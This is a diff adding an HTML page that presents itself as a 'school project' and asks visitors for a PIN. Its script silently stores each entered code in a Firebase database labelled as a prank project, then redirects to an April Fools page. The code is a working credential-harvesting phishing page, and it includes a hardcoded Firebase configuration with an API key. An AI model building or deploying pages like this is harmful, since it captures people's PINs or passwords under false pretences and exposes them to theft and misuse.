@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>My School Project</title>
+  <style>
+    body {
+      background-color: #f0f8ff;
+      color: #333;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      color: #ff6347;
+    }
+    input[type="password"] {
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+      border: 2px solid #ff6347;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #ff6347;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #ff4500;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome to My School Project</h1>
+  <p>Please enter your pin:</p>
+  <input type="password" id="codeInput" placeholder="Enter code here">
+  <br>
+  <button onclick="submitCode()">Submit</button>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCL8AMNwg0UBtZVeMliWGDud4PJBsG9-BE",
+      authDomain: "school-project-prank.firebaseapp.com",
+      databaseURL: "https://school-project-prank-default-rtdb.firebaseio.com",
+      projectId: "school-project-prank",
+      storageBucket: "school-project-prank.firebasestorage.app",
+      messagingSenderId: "454638524060",
+      appId: "1:454638524060:web:56768951cca73db5073f59"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    function submitCode() {
+      const input = document.getElementById("codeInput").value.trim();
+      if (!input) {
+        alert("Please enter a code.");
+        return;
+      }
+
+      const timestamp = Date.now();
+      firebase.database().ref("codes/" + timestamp).set({
+        code: input
+      }).then(() => {
+        window.location.href = "april-fools.html"; // Optional prank redirect
+      }).catch((error) => {
+        alert("Error saving code: " + error.message);
+      });
+    }
+  </script>
+</body>
+</html>
